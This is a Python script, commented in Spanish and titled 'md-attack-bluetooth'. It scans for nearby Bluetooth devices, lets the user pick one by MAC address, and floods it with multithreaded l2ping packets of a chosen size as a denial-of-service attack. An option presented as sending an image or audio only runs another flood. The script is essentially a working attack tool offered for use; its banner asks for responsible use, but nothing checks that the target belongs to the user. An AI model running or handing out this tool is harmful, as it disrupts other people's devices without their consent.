import os
import subprocess
import threading
import time
import platform
import logging
from concurrent.futures import ThreadPoolExecutor

# Configuración del logging
logging.basicConfig(level=logging.INFO)

# Función para verificar e instalar programas necesarios
def check_and_install_programs(programs):
    logging.info("[*] Verificando programas necesarios...")
    for program in programs:
        result = subprocess.run(['which', program], capture_output=True, text=True)
        if result.returncode != 0:
            logging.warning(f"[!] {program} no está instalado. Instalando {program}...")
            subprocess.run(['sudo', 'apt-get', 'install', '-y', program])
        else:
            logging.info(f"[*] {program} ya está instalado.")

# Función para validar si el servicio Bluetooth y SDP están activos
def check_and_activate_bluetooth_services():
    logging.info("[*] Verificando servicios de Bluetooth y SDP...")
    try:
        # Verificar si el servicio Bluetooth está activo
        bluetooth_status = subprocess.run(['hciconfig', 'hci0', 'up'], capture_output=True)
        if bluetooth_status.returncode != 0:
            logging.warning("[!] El servicio Bluetooth está inactivo. Activando...")
            subprocess.run(['sudo', 'hciconfig', 'hci0', 'up'])
        else:
            logging.info("[*] El servicio Bluetooth está activo.")

        # Verificar si el servidor SDP está activo
        sdp_status = subprocess.run(['sdptool', 'browse', 'local'], capture_output=True)
        if sdp_status.returncode != 0:
            logging.warning("[!] El servidor SDP no está activo. Activando...")
            subprocess.run(['sudo', 'systemctl', 'restart', 'bluetooth'])
        else:
            logging.info("[*] El servidor SDP está activo.")
    
    except subprocess.CalledProcessError as e:
        logging.error(f"[!] Error al verificar los servicios: {e}")
        exit(1)

# Función para el ataque DOS
def DOS(target_addr, package_size):
    subprocess.run(['l2ping', '-i', 'hci0', '-s', str(package_size), '-f', target_addr])

# Función para mostrar el banner del programa
def print_banner():
    logging.info("============================================")
    logging.info("          md-attack-bluetooth")
    logging.info("      Creado por midesmis - Use responsablemente")
    logging.info("  Debe utilizarse en entornos controlados")
    logging.info("============================================")

# Función para escanear dispositivos Bluetooth cercanos
def scan_devices():
    try:
        output = subprocess.run(['hcitool', 'scan'], capture_output=True, text=True).stdout
        devices = {}
        for idx, line in enumerate(output.splitlines()[1:]):  # Omitir la primera línea
            parts = line.split()
            devices[idx] = {'mac': parts[0], 'name': ' '.join(parts[1:])}
        return devices
    except subprocess.CalledProcessError:
        logging.error("[!] Error al escanear dispositivos.")
        return {}

# Función para iniciar ataque DOS usando hilos controlados
def initiate_dos_attack(target_addr, package_size, threads_count):
    with ThreadPoolExecutor(max_workers=threads_count) as executor:
        for _ in range(threads_count):
            executor.submit(DOS, target_addr, package_size)

# Función para validar la compatibilidad del sistema operativo
def check_os_compatibility():
    if platform.system() != 'Linux':
        logging.error("[!] Este programa solo es compatible con Linux.")
        exit(1)

# Función principal del programa
def main():
    print_banner()

    # Verificar la compatibilidad del sistema operativo
    check_os_compatibility()

    # Lista de programas necesarios
    required_programs = ['hcitool', 'l2ping', 'sdptool', 'bluetoothctl']
    
    # Verificar e instalar los programas necesarios
    check_and_install_programs(required_programs)
    
    # Validar e iniciar los servicios de Bluetooth y SDP
    check_and_activate_bluetooth_services()
    
    # Escaneo de dispositivos cercanos
    logging.info("Escaneando dispositivos Bluetooth cercanos...")
    devices = scan_devices()

    if not devices:
        logging.warning("[!] No se encontraron dispositivos.")
        return

    # Mostrar dispositivos encontrados
    for idx, device in devices.items():
        logging.info(f"{idx}. MAC: {device['mac']}, Nombre: {device['name']}")

    # Selección del dispositivo por ID
    try:
        target_id = int(input("Seleccione el ID del dispositivo para el ataque: "))
        target_device = devices[target_id]
        target_addr = target_device['mac']
        logging.info(f"[*] Dispositivo seleccionado: {target_device['name']} ({target_addr})")
    except (KeyError, ValueError):
        logging.error("[!] ID inválido.")
        return

    # Opción para enviar imagen o audio antes del ataque
    send_media = input("¿Desea enviar una imagen o audio antes del ataque? (y/n): ").lower()
    if send_media == 'y':
        media_file = input("Ingrese la ruta del archivo de imagen o audio a enviar: ")
        logging.info(f"[*] Enviando {media_file} a {target_addr}...")
        # Simulación del envío
        subprocess.run(['l2ping', '-i', 'hci0', '-s', '600', '-f', target_addr])
    
    # Configurar el ataque DOS
    try:
        package_size = int(input("Ingrese el tamaño del paquete para el ataque DOS: "))
        if package_size <= 0:
            raise ValueError("El tamaño del paquete debe ser mayor que cero.")
        threads_count = int(input("Ingrese la cantidad de hilos para el ataque DOS: "))
    except ValueError as e:
        logging.error(f"[!] Entrada inválida: {e}")
        return

    logging.info("[*] Iniciando ataque DOS en 3 segundos...")
    time.sleep(3)

    # Iniciar el ataque DOS
    initiate_dos_attack(target_addr, package_size, threads_count)

    logging.info("[*] Ataque DOS en ejecución...")

    # Estado de salida exitoso
    logging.info("[*] Saliendo del programa exitosamente.")
    exit(0)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        logging.warning("\n[!] Programa abortado.")
        exit(0)
